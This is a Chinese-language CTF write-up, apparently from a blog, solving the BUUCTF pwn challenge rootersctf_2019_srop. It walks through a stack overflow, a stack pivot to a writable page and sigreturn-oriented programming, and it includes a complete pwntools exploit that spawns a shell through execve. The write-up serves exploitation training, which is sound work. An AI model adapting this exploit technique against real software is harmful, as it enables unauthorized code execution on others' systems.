---
title: BUUCTF-rootersctf_2019_srop 题解
date: 2026-01-12 09:32:00
tags: 
    - 栈迁移
    - srop
    - stack
    - pwn
    - BUUCTF
categories: pwn 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#rootersctf_2019_srop)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/rootersctf_2019_srop/checksec.png)

### vmmap

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/rootersctf_2019_srop/vmmap.png)

注意到 0x402000 开始有 rw 权限，在没法泄露栈地址时考虑栈迁移到上面

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/rootersctf_2019_srop/IDA.png)

代码很简洁，有一个栈溢出漏洞，且有 `pop rax; syscall; leave; retn;` gadget ，很方便进行 srop

### 思路

考虑利用 srop 与栈迁移，在 0x402000 处布局栈：

```
+-------------------+
|     ret2gadget    |   0x402010  (rsp)
+-------------------+
|        rbp        |   0x402008
+-------------------+
|   "/bin/sh\x00"   |   0x402000
+-------------------+
```

利用 gadget 调用 execve syscall 即可

### exp

```python
from pwn import *

elf = ELF("./srop")
context.clear()
context.arch = "amd64"
context.log_level = 'debug'

io = process("./srop")

pop_rax_syscall_leave_retn = 0x401032
syscall_leave_retn = 0x401033

frame1 = SigreturnFrame(kernel="amd64")
frame1.rax = 0
frame1.rdi = 0
frame1.rsi = 0x402000
frame1.rdx = 0x400
frame1.rip = syscall_leave_retn
frame1.rbp = 0x402008
frame1.rsp = 0x402010

rax = p64(0xf)
payload1 = b"A" * (0x80 + 8) + p64(pop_rax_syscall_leave_retn) + rax + bytes(frame1)

io.recvuntil(b'CTF?\n')
io.sendline(payload1)

path = b"/bin/sh\x00"

frame2 = SigreturnFrame(kernel="amd64")
frame2.rax = 59
frame2.rdi = 0x402000
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_leave_retn

payload2 = path + p64(0x402008) + p64(pop_rax_syscall_leave_retn) + rax + bytes(frame2)


io.sendline(payload2)
io.interactive()
```